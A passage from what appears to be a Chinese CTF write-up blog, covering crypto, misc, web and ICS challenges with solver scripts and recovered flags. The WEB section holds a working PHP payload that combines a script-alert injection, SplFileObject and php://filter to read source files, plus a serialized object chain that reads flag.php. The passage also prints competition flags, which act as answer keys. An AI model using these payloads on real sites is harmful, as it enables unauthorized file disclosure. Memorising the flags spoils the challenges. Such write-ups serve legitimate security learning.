class="hljs-number">0x79622d32</span>, <span class="hljs-number">0x6b206574</span>]<br>        bring[<span class="hljs-number">4</span>:<span class="hljs-number">12</span>] = unpack(<span class="hljs-string">&#x27;&lt;8L&#x27;</span>, self.passphrase)<br>        bring[<span class="hljs-number">12</span>] = bring[<span class="hljs-number">13</span>] = <span class="hljs-number">0x0</span><br>        bring[<span class="hljs-number">14</span>:] = [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            w = <span class="hljs-built_in">list</span>(bring)<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xe</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>)<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> pack(<span class="hljs-string">&#x27;&lt;16L&#x27;</span>, *((w[_] + bring[_]) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))):<br>                <span class="hljs-keyword">yield</span> c<br>            bring[<span class="hljs-number">12</span>] = (bring[<span class="hljs-number">12</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br>            <span class="hljs-keyword">if</span> bring[<span class="hljs-number">12</span>] == <span class="hljs-number">0</span>:<br>                bring[<span class="hljs-number">13</span>] = (bring[<span class="hljs-number">13</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br><br>key = <span class="hljs-string">&#x27;52f0907eca3ce05d8d0b6691bb8c8dbca19b63b7bcfcf033fc320f182b5ad610&#x27;</span><br>enc = <span class="hljs-string">&#x27;6d9b546c9f1f5e7116203933dabbf25e3a0e143122b20c27e5c83ea26b9d0dbb&#x27;</span><br><br>key, enc = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">bytes</span>.fromhex, (key, enc))<br><br>key = (key * (<span class="hljs-number">32</span> // <span class="hljs-built_in">len</span>(key) + <span class="hljs-number">1</span>))[:<span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">for</span> rand <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">2</span>):<br>    stream = AS(key)<br>    rand = <span class="hljs-built_in">bytes</span>(rand) * <span class="hljs-number">16</span><br>    passphrase = <span class="hljs-built_in">bytes</span>(a ^ b ^ c <span class="hljs-keyword">for</span> a, b, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, stream.go(), rand))<br>    msg = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(passphrase, key))<br>    <span class="hljs-keyword">if</span> (msg.startswith(<span class="hljs-string">b&#x27;HSNCTF&#123;&#x27;</span>)):<br>        <span class="hljs-built_in">print</span>(msg)<br>        <br><span class="hljs-comment">#HSNCTF&#123;91404a209e0f9ab7d245d5ee&#125;</span><br></code></pre></td></tr></table></figure><h2 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h2><p>密码表里多了一对括号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import <span class="hljs-keyword">string</span><br>import itertools<br><br>dicts = <span class="hljs-keyword">string</span>.ascii_lowercase +<span class="hljs-string">&quot;&#123;&#125;&quot;</span><br><span class="hljs-comment">#print(dicts)</span><br><span class="hljs-comment"># key = (&#x27;&#x27;.join([random.choice(dicts) for i in range(4)])) * 8</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k in itertools.<span class="hljs-title function_ invoke__">product</span>(dicts,repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(k)<br>    <span class="hljs-comment"># print(key)</span><br>    numenc = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in enc]<br>    numkey = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(enc)):<br>        <span class="hljs-comment"># assert len(numenc) == len(numkey)</span><br>        ans = (numenc[i] - numkey[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#x27;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>            <br><span class="hljs-comment">#hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>公众号回复签到题即可<br><code>hsnctf&#123;welcome_to_hsnctf&#125;</code></p><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>根据<code>Cloakify.txt</code>名字知道是Cloakify隐写 ：<a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a><br>得到一个txt文件  根据PK得知为zip文件 改后缀 发现是压缩包套娃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *<br><br>name = <span class="hljs-string">&#x27;f2332&#x27;</span><br>num = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)    <span class="hljs-comment">#读取zip文件</span><br>password = name<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fz.namelist():         <span class="hljs-comment">#遍历zip内文件名</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> <span class="hljs-keyword">in</span> i:      <span class="hljs-comment">#判断当前文件是否是zip文件</span><br>        newpassword = i[<span class="hljs-number">0</span>:-<span class="hljs-number">4</span>]   <span class="hljs-comment">#压缩密码为zip文件名，取出</span><br><span class="hljs-built_in">print</span>(newpassword)<br><span class="hljs-comment"># fz.extractall(pwd=bytes(password, &#x27;utf-8&#x27;))       #提取zip文件</span><br>fz.extractall()<br>num +=<span class="hljs-number">1</span><br>name = newpassword<br></code></pre></td></tr></table></figure><p>解开套娃之后即可得到flag<br><code>hsnctf&#123;66eec912-e9ce-4e1d-ac54-ecea075dcb96&#125;</code></p><h2 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h2><p><img src="/mdimg/2023sswk/2.png"><br>flag.txt比flag.rar小很多怀疑有其他文件 但binwalk无果  在010发现hillstone.wav  Ntfs隐写  导出wav文件<br><img src="/mdimg/2023sswk/3.png"><br>SSTV解密<br><img src="/mdimg/2023sswk/4.png"><br>flag.txt   base64转zip文件  解压即可得到flag<br><code> hsnctf&#123;70995fb0-eb60-0787-f305-77066aeb6730&#125;</code></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h2><p>参考：<a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a><br>用Exception和<code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code>绕过<br><code>payload:?class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>拿到源码构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1 = <span class="hljs-variable">$b1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;r1 = <span class="hljs-variable">$r1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$w</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w = <span class="hljs-variable">$w</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c1 = <span class="hljs-variable">$c1</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h1 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h1><h2 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h2><p><img src="/mdimg/2023sswk/5.png"><br><code>hsnctf&#123;399&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 冬令营</title>
    <link href="/2023/02/06/2023HWS/"/>
    <url>/2023/02/06/2023HWS/</url>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>题目信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag,a,b<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br> <br>D = <span class="hljs-number">0x1337</span><br><span class="hljs-keyword">assert</span> a**<span class="hljs-number">2</span> - D*b**<span class="hljs-number">2</span> == <span class="hljs-number">1</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>x = (a * m + b) % p<br>y=<span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:]<br>c=[y[i:i+<span class="hljs-number">85</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(y),<span class="hljs-number">85</span>)]<br>shuffle(c)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(c)<br> <br><span class="hljs-comment"># p=11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br><span class="hljs-comment"># c=[&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;, &#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;, &#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;, &#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;, &#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;, &#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;]</span><br></code></pre></td></tr></table></figure><p><strong>D = 0x1337 a2 - D*b2 == 1</strong><code>为Pell方程 网站在线（[http://www.numbertheory.org/php/pell.html](http://www.numbertheory.org/php/pell.html)）解一下，得到方程a，b的最小整数解 </code>a = 1809338099956399320，b = 25797719546469589</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br>D = <span class="hljs-number">0x1337</span><br>a = [<span class="hljs-number">1809338099956399320</span>]<br>b = [<span class="hljs-number">25797719546469589</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    a, b = a + [a[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>] + D * b[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>]], b + [a[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>] + b[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>]]<br><br>p=<span class="hljs-number">11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br>c=[<span class="hljs-string">&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;</span>, <span class="hljs-string">&#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;</span>, <span class="hljs-string">&#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;</span>, <span class="hljs-string">&#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;</span>, <span class="hljs-string">&#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;</span>, <span class="hljs-string">&#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;</span>]<br>res = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(res), <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> permutations(c)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    ai, bi = a[i], b[i]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> res:<br>        m = (c - bi) * inverse(ai, p) % p<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;flag&#123;5b80aaa2-2bb2-0ef1-4aa0-a5a9387239d5&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Numbers-Game"><a href="#Numbers-Game" class="headerlink" title="Numbers Game"></a>Numbers Game</h2><p>题目不难，比赛的时候没搞出来很难受呜呜呜<br>MT19937还原，根据624组32bit的数据还原state之后逆推上一组state进而得到前12个32bit的随机数值。参考: <a href="https://blog.csdn.net/zippo1234/article/details/109279944">https://blog.csdn.net/zippo1234/article/details/109279944</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp&gt;&gt;shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment">#逆求的32bit 组数 此处需要逆求12组</span><br>        tmp = state[i+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">397</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">396</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_state</span>(<span class="hljs-params">out</span>):<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out:<br>        i = inverse_right(i,<span class="hljs-number">18</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">15</span>,<span class="hljs-number">0xefc60000</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">7</span>,<span class="hljs-number">0x9d2c5680</span>)<br>        i = inverse_right(i,<span class="hljs-number">11</span>)<br>        state.append(i)<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">id</span>=[<span class="hljs-string">&#x27;d5d97afad7ef619b4badd8d2da10ee24&#x27;</span>, <span 